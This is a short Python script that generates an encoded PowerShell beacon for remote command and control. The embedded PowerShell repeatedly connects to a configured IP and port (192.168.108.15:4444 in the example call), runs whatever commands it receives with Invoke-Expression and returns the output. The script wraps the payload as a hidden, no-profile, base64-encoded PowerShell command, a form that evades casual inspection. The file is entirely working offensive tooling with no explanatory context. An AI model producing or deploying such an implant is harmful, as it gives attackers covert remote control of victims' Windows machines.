import base64

def win(ip, port, delay, jitter):
    parameters = f"""
    $ServerIP = "{ip}"
    $ServerPort = {port}
    $Delay = {delay}
    $Jitter = {jitter}
    """
    code = """
    # Function to generate random sleep interval
    function Get-RandomSleepTime {
        param (
            [int]$BaseDelay,
            [int]$Jitter
        )
        $lower = $BaseDelay - $Jitter
        $upper = $BaseDelay + $Jitter
        return Get-Random -Minimum $lower -Maximum ($upper + 1)
    }

    # Infinite loop to beacon to the agent server
    while ($true) {
        try {
            # Establish TCP connection
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($ServerIP, $ServerPort)
            $stream = $tcpClient.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            Write-Host "[$(Get-Date)] Checking in..."

            # Inner loop to read and execute commands from the server
            while ($tcpClient.Connected -and $stream.DataAvailable) {
                # Read command from the server if available
                $command = $reader.ReadLine()
                if ($command) {
                    Write-Host "Received command: $command"
                    
                    # Execute the command and capture output
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                    } catch {
                        $output = "Error executing command: $_"
                    }
                    
                    # Ensure output is in string format, handling arrays properly
                    $formattedOutput = ($output -join "`n").Trim()
                    
                    # Send output back to server
                    $writer.WriteLine($formattedOutput)
                    $writer.WriteLine("ac2delim")
                }
                Start-Sleep -Milliseconds 500 # Short pause between command checks
            }

            # Close connection after processing commands
            $reader.Close()
            $writer.Close()
            $tcpClient.Close()
        }
        catch {
            Write-Host "Failed to connect or connection lost. Retrying after delay..."
        }

        # Calculate randomized sleep time and wait before next connection attempt
        $sleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
        Start-Sleep -Seconds $sleepTime
    }
    """
    payload = parameters + code
    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
    enc_payload = "powershell -nop -w hidden -e " + b64

    return enc_payload

print(win("192.168.108.15", 4444, 10, 3))